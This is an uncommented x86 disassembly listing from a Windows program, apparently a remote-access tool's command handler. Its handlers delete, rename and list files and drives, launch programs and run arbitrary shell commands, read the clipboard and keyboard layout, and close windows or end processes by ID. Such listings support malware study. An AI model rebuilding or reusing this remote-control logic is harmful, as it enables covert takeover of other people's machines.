je r-xdata
lea eax [ edi - 0x88 ]
cmp eax 0xa
ja r-xdata
je r-xdata
push 0x0
lea ecx [ ebp - 0x10 ]
call sub_401289
push eax
lea eax [ ebp - 0xa4 ]
push eax
call sub_410fd0
pop ecx
pop ecx
mov ecx eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
call [ DeleteFileW@IAT ]
lea ecx [ ebp - 0xa4 ]
jmp r-xdata
lea eax [ edi - 0x1 ]
cmp eax 0x1e
ja r-xdata
lea ecx [ ebp - 0x10 ]
call sub_401ad8
lea ecx [ ebp - 0x84 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x64 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
pop edi
pop esi
xor eax eax
pop ebx
leave
retn 0x4
jmp [ eax * 4 + jump_table_40de42 ]
lea eax [ ebp - 0x5b8 ]
push eax
push 0x64
call [ GetLogicalDriveStringsA@IAT ]
lea eax [ ebp - 0x39 ]
lea ecx [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x5b8 ]
push 0x64
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push 0x2
push 0x0
push r--data
lea ecx [ ebp - 0x20 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::find@IAT ]
inc eax
lea ecx [ ebp - 0x20 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::resize@IAT ]
sub esp 0x10
lea eax [ ebp - 0x20 ]
mov ecx esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea eax [ ebp - 0x174 ]
push eax
call sub_403195
pop ecx
mov edi esp
push eax
lea eax [ ebp - 0x20 ]
push esi
push eax
lea eax [ ebp - 0x154 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
push edi
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
mov ecx rw-data
push 0x51
call sub_402062
lea ecx [ ebp - 0x154 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x174 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x20 ]
jmp r-xdata
lea eax [ edi - 0x21 ]
cmp eax 0x13
ja r-xdata
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
jmp [ eax * 4 + jump_table_40dd76 ]
push 0x1
lea ecx [ ebp - 0x10 ]
call sub_401289
push eax
lea eax [ ebp - 0x20 ]
push eax
call sub_410fd0
push ecx
push ecx
lea eax [ ebp - 0x20 ]
mov ecx esp
push eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
xor ebx ebx
lea ecx [ ebp - 0x10 ]
push ebx
call sub_401289
sub esp 0x10
mov ecx esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
call sub_402dbf
add esp 0x20
lea ecx [ ebp - 0x20 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::length@IAT ]
dec eax
lea ecx [ ebp - 0x20 ]
dec eax
push eax
lea eax [ ebp - 0x1b4 ]
push ebx
push eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::substr@IAT ]
push eax
lea eax [ ebp - 0x194 ]
push eax
call sub_410f44
push ecx
push ecx
mov ecx esp
push eax
push r--data
push ecx
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@PBDABV10@@Z
push ecx
lea eax [ ebp - 0x44 ]
mov ecx esp
push eax
push r--data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
call sub_410498
add esp 0x20
lea ecx [ ebp - 0x194 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x1b4 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x20 ]
jmp r-xdata
xor ebx ebx
lea ecx [ ebp - 0x10 ]
push ebx
call sub_401289
push eax
lea eax [ ebp - 0x20 ]
push eax
call sub_410fd0
pop ecx
pop ecx
push 0x1
push ebx
push ebx
lea ecx [ ebp - 0x20 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
push r--data
push ebx
call [ ShellExecuteW@IAT ]
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x1d4 ]
push eax
call sub_410f44
push ecx
push ecx
mov ecx esp
push eax
push r--data
push ecx
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@PBDABV10@@Z
push ecx
lea eax [ ebp - 0x3b ]
mov ecx esp
push eax
push r--data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
call sub_410498
add esp 0x20
lea ecx [ ebp - 0x1d4 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x20 ]
jmp r-xdata
lea ecx [ ebp - 0x598 ]
call sub_40de6e
push 0x3
lea ecx [ ebp - 0x10 ]
call sub_401289
sub esp 0x10
mov ecx esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push 0x2
lea ecx [ ebp - 0x10 ]
call sub_401289
sub esp 0x10
mov ecx esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push 0x1
lea ecx [ ebp - 0x10 ]
call sub_401289
sub esp 0x10
mov ecx esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
xor ebx ebx
lea ecx [ ebp - 0x10 ]
push ebx
call sub_401289
push eax
lea eax [ ebp - 0x1f4 ]
push eax
call sub_410fd0
pop ecx
pop ecx
mov ecx eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
lea ecx [ ebp - 0x598 ]
call sub_403267
lea ecx [ ebp - 0x1f4 ]
mov [ ebp + 0xb ] al
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
cmp [ ebp + 0xb ] bl
push ebx
lea ecx [ ebp - 0x10 ]
je r-xdata
xor ebx ebx
lea ecx [ ebp - 0x10 ]
push ebx
push 0x3
call sub_401289
sub esp 0x10
lea ecx [ ebp - 0x10 ]
mov edi esp
push eax
push esi
push 0x2
call sub_401289
push eax
push esi
push 0x1
lea ecx [ ebp - 0x10 ]
call sub_401289
push eax
lea eax [ ebp - 0x2d4 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x2b4 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x294 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
push edi
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push 0x56
call sub_4024bf
add esp 0x18
lea ecx [ ebp - 0x294 ]
mov edi eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x2b4 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x2d4 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push ebx
lea ecx [ ebp - 0x10 ]
call sub_401289
push eax
lea eax [ ebp - 0x314 ]
push eax
call sub_410fd0
push eax
lea eax [ ebp - 0x2f4 ]
push eax
call sub_410f44
mov ecx esp
push eax
push r--data
push ecx
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@PBDABV10@@Z
push ecx
lea eax [ ebp - 0x41 ]
mov ecx esp
mov esi r--data
push eax
push esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
call sub_410498
add esp 0x20
lea ecx [ ebp - 0x2f4 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x314 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea eax [ ebp - 0x3f ]
lea ecx [ ebp - 0x20 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push 0x4
lea ecx [ ebp - 0x10 ]
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call [ atoi@IAT ]
cdq
push edx
push eax
lea eax [ ebp - 0x20 ]
push eax
push edi
call sub_402f64
add esp 0x14
test al al
push ebx
je r-xdata
lea eax [ ebp - 0x36 ]
xor ebx ebx
push eax
push ebx
lea ecx [ ebp - 0x10 ]
call sub_401289
push eax
lea eax [ ebp - 0x3d4 ]
push eax
call sub_410fd0
pop ecx
pop ecx
mov ecx eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
lea ecx [ ebp - 0x20 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x3d4 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x20 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
call [ GetFileAttributesW@IAT ]
test al 0x10
lea ecx [ ebp - 0x20 ]
je r-xdata
push 0x1
lea ecx [ ebp - 0x10 ]
call sub_401289
push eax
lea eax [ ebp - 0x20 ]
push eax
call sub_410fd0
pop ecx
pop ecx
push 0x2
lea ecx [ ebp - 0x10 ]
call sub_401289
push eax
lea eax [ ebp - 0x74 ]
push eax
call sub_410fd0
mov eax [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::npos@IAT ]
pop ecx
pop ecx
push [ eax ]
lea ecx [ ebp - 0x20 ]
push 0x5c
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::rfind@IAT ]
inc eax
xor ebx ebx
push eax
lea eax [ ebp - 0x34 ]
push ebx
push eax
lea ecx [ ebp - 0x20 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::substr@IAT ]
lea eax [ ebp - 0x74 ]
push eax
lea eax [ ebp - 0x34 ]
push eax
lea eax [ ebp - 0x494 ]
push eax
call ??Hstd@@YA?AV?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@0@ABV10@0@Z
add esp 0xc
mov ecx eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
lea ecx [ ebp - 0x20 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
call [ _wrename@IAT ]
neg eax
pop ecx
sbb al al
pop ecx
inc al
lea ecx [ ebp - 0x494 ]
mov [ ebp + 0xb ] al
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
cmp [ ebp + 0xb ] bl
je r-xdata
push 0x1
lea ecx [ ebp - 0x10 ]
call sub_401289
push eax
lea eax [ ebp - 0x20 ]
push eax
call sub_410fd0
pop ecx
xor ebx ebx
pop ecx
push ebx
push 0x2
lea ecx [ ebp - 0x10 ]
call sub_401289
push eax
lea eax [ ebp - 0x4f4 ]
push eax
call sub_410fd0
push eax
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x4d4 ]
push eax
call ??Hstd@@YA?AV?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@0@ABV10@0@Z
add esp 0x14
mov ecx eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
call [ CreateDirectoryW@IAT ]
lea ecx [ ebp - 0x4d4 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x4f4 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
push 0x2a
lea ecx [ ebp - 0x20 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::operator-=@IAT ]
sub esp 0x10
lea eax [ ebp - 0x20 ]
mov ecx esp
push eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
push ebx
lea ecx [ ebp - 0x10 ]
call sub_401289
sub esp 0x10
mov ecx esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
call sub_402dbf
add esp 0x20
lea ecx [ ebp - 0x20 ]
jmp r-xdata
push 0x2
lea ecx [ ebp - 0x10 ]
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call [ atoi@IAT ]
mov [ ebp - 0x1c ] eax
lea eax [ ebp + 0x8 ]
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x18 ]
push eax
call sub_410e3e
pop ecx
lea eax [ ebp - 0x1c ]
pop ecx
push eax
mov ecx rw-data
call sub_40dfff
push 0x3
lea ecx [ ebp - 0x10 ]
call sub_401289
sub esp 0x10
mov ecx esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push 0x2
lea ecx [ ebp - 0x10 ]
call sub_401289
sub esp 0x10
mov ecx esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push 0x1
lea ecx [ ebp - 0x10 ]
call sub_401289
sub esp 0x10
mov ecx esp
push eax
push ecx
call sub_410fd0
pop ecx
pop ecx
push 0x0
lea ecx [ ebp - 0x10 ]
call sub_401289
sub esp 0x10
mov ecx esp
push eax
push ecx
call sub_410fd0
pop ecx
pop ecx
lea ecx [ ebp + 0x8 ]
call sub_403693
lea ecx [ ebp + 0x8 ]
call sub_403e4f
jmp r-xdata
push 0x0
lea ecx [ ebp - 0x10 ]
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call [ atoi@IAT ]
push eax
call sub_403dbc
jmp r-xdata
push 0x0
lea ecx [ ebp - 0x10 ]
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call [ StrToIntA@IAT ]
push 0x1
lea ecx [ ebp - 0x10 ]
mov esi eax
call sub_401289
push eax
lea eax [ ebp - 0x514 ]
push eax
call sub_410fd0
pop ecx
pop ecx
mov ecx eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
push esi
call sub_411b89
pop ecx
pop ecx
lea ecx [ ebp - 0x514 ]
jmp r-xdata
push 0x0
lea ecx [ ebp - 0x10 ]
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call [ StrToIntA@IAT ]
push 0x1
lea ecx [ ebp - 0x10 ]
mov esi eax
call sub_401289
push eax
lea eax [ ebp - 0x534 ]
push eax
call sub_410fd0
pop ecx
pop ecx
mov ecx eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
lea eax [ ebp - 0x34 ]
push 0x30
push eax
call sub_407cfa
add esp 0xc
lea ecx [ ebp - 0x534 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x34 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
push 0x2
lea ecx [ ebp - 0x10 ]
call sub_401289
sub esp 0x10
mov ecx esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
call sub_4115d9
add esp 0x14
lea ecx [ ebp - 0x34 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
push esi
call sub_411b89
pop ecx
pop ecx
lea ecx [ ebp - 0x34 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
jmp r-xdata
mov ecx [ OpenClipboard@IAT ]
xor ebx ebx
jmp [ eax * 4 + jump_table_40ddf2 ]
call [ GetTickCount@IAT ]
push eax
lea eax [ ebp - 0x124 ]
push eax
call sub_410e67
push ecx
push ecx
mov edi esp
push eax
push esi
call sub_4109c6
push eax
lea eax [ ebp - 0x344 ]
push eax
call sub_410e67
pop ecx
pop ecx
push eax
lea eax [ ebp - 0x104 ]
push esi
push eax
call sub_41098b
push eax
lea eax [ ebp - 0x4e4 ]
push eax
call sub_410fa4
add esp 0xc
xor ebx ebx
lea ecx [ ebp - 0x10 ]
push eax
push esi
push ebx
call sub_401289
push eax
lea eax [ ebp - 0xe4 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x324 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0xc4 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x444 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x224 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
push edi
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
mov esi rw-data
mov ecx esi
push 0x4c
call sub_402062
lea ecx [ ebp - 0x224 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x444 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0xc4 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x324 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0xe4 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x4e4 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x104 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x344 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x124 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push 0x1
lea ecx [ ebp - 0x10 ]
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call [ atoi@IAT ]
cmp eax ebx
pop ecx
jbe r-xdata
push 0x0
mov ecx rw-data
xor ebx ebx
push r--data
push ebx
lea ecx [ ebp - 0x10 ]
call sub_401289
mov esi [ std::operator==@IAT ]
push eax
call esi
pop ecx
test al al
pop ecx
je r-xdata
xor ebx ebx
push r--data
push ebx
lea ecx [ ebp - 0x10 ]
call sub_401289
mov esi [ std::operator==@IAT ]
push eax
call esi
pop ecx
test al al
pop ecx
je r-xdata
lea eax [ ebp - 0x50 ]
push 0xa
push eax
call [ GetCurrentProcessId@IAT ]
push eax
call [ _itoa@IAT ]
push ecx
lea eax [ ebp - 0x50 ]
mov edi esp
push eax
lea eax [ ebp - 0x184 ]
push esi
push eax
call sub_408fa5
pop ecx
push eax
lea eax [ ebp - 0x554 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
push edi
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
add esp 0xc
mov ecx rw-data
push 0x4f
call sub_402062
lea ecx [ ebp - 0x554 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x184 ]
jmp r-xdata
push 0x0
lea ecx [ ebp - 0x10 ]
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call [ atoi@IAT ]
push eax
call sub_410e0b
jmp r-xdata
push 0x0
lea ecx [ ebp - 0x10 ]
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call [ atoi@IAT ]
pop ecx
push eax
call [ CloseWindow@IAT ]
jmp r-xdata
push 0x3
jmp r-xdata
push 0x9
lea eax [ ebp - 0x54 ]
lea ecx [ ebp - 0x10 ]
push eax
push 0x0
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call [ atoi@IAT ]
pop ecx
push eax
call [ GetWindowThreadProcessId@IAT ]
push [ ebp - 0x54 ]
call sub_410e0b
pop ecx
call sub_40df6b
jmp r-xdata
push 0x0
lea ecx [ ebp - 0x10 ]
call sub_401289
push eax
lea eax [ ebp - 0x384 ]
push eax
call sub_410fd0
pop ecx
pop ecx
mov ecx eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
call [ _wsystem@IAT ]
pop ecx
lea ecx [ ebp - 0x384 ]
jmp r-xdata
push 0x0
lea ecx [ ebp - 0x10 ]
call sub_401289
sub esp 0x10
mov ecx esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea eax [ ebp - 0x34 ]
push eax
call sub_4109e7
pop ecx
lea eax [ ebp - 0x34 ]
mov ecx esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push 0x62
mov ecx rw-data
call sub_402062
lea ecx [ ebp - 0x34 ]
jmp r-xdata
xor ebx ebx
push 0x1
push ebx
push ebx
push ebx
lea ecx [ ebp - 0x10 ]
call sub_401289
push eax
lea eax [ ebp - 0x1a4 ]
push eax
call sub_410fd0
pop ecx
pop ecx
mov ecx eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
push r--data
push ebx
call [ ShellExecuteW@IAT ]
lea ecx [ ebp - 0x1a4 ]
jmp r-xdata
xor ebx ebx
cmp [ rw-data ] ebx
mov [ rw-data ] bl
je r-xdata
mov [ rw-data ] 0x1
mov ecx rw-data
jmp r-xdata
and [ ebp - 0x1c ] 0x0
xor eax eax
lea edi [ ebp - 0x1b ]
stosd [ edi ]
stosd [ edi ]
lea eax [ ebp - 0x1c ]
push eax
call [ GetKeyboardLayoutNameA@IAT ]
mov ecx rw-data
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
call sub_41160e
push eax
lea eax [ ebp - 0x3c4 ]
push eax
call sub_410e67
push ecx
mov edi esp
push eax
push esi
lea eax [ ebp - 0x204 ]
push [ rw-data ]
push eax
call sub_410e67
pop ecx
pop ecx
push eax
push esi
push 0x12
mov ecx rw-data
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::data@IAT ]
mov al [ eax ]
push eax
lea eax [ ebp - 0x1c ]
push esi
push eax
lea eax [ ebp - 0x504 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@PBDABV10@@Z
add esp 0xc
push eax
lea eax [ ebp - 0x1e4 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@D@Z
add esp 0xc
push eax
lea eax [ ebp - 0x3a4 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x1c4 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x484 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
push edi
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
mov ecx rw-data
push 0x12
call sub_402062
lea ecx [ ebp - 0x484 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x1c4 ]
